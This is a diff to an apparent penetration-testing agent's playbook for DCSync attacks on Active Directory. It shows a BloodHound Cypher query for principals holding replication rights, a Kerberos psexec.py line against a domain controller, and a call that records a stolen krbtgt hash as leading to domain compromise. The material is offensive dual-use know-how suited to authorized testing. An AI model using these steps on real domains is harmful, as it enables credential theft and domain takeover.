@@ -15,13 +15,7 @@ domain controllers to replicate. The "vulnerability" is when a
 non-DC principal has the replication-rights ACL.
 
 ## 1. Identify DCSync candidates
-From BloodHound:
-```
-kg_query(kind="user", filter="dcsync=true") +
-kg_query(kind="group", filter="dcsync=true")
-```
-
-Or Cypher direct:
+From the BloodHound graph (`bhce_cypher`):
 ```
 MATCH (n)-[:GetChanges|GetChangesAll]->(:Domain)
 RETURN DISTINCT n.name, labels(n)
@@ -92,12 +86,16 @@ psexec.py -k -no-pass 'DC@DC_FQDN'
 
 ## 6. Promote
 ```
-kg_add_node(kind="credential", label="krbtgt:NT_HASH",
-            props={"source":"dcsync","value":"<hash>"})
-kg_add_node(kind="vulnerability", label="DCSync from <principal>",
-            props={"severity":"critical"})
-kg_add_edge(src=<vuln>, dst=<krbtgt>, kind="extracts")
-kg_add_edge(src=<krbtgt>, dst=<crown_jewel:domain>, kind="compromises")
+kg_record('[
+  {"kind": "Credential", "key": "credential::krbtgt",
+   "label": "krbtgt:NT_HASH",
+   "props": {"source": "dcsync", "value": "<hash>"},
+   "edges_out": [{"to_key": "crown-jewel::domain", "kind": "LEADS_TO"}]},
+  {"kind": "Vulnerability", "key": "vuln::dcsync::<principal>",
+   "label": "DCSync from <principal>",
+   "props": {"severity": "critical"},
+   "edges_out": [{"to_key": "credential::krbtgt", "kind": "LEAKS"}]}
+]')
 ```
 
 ## OPSEC
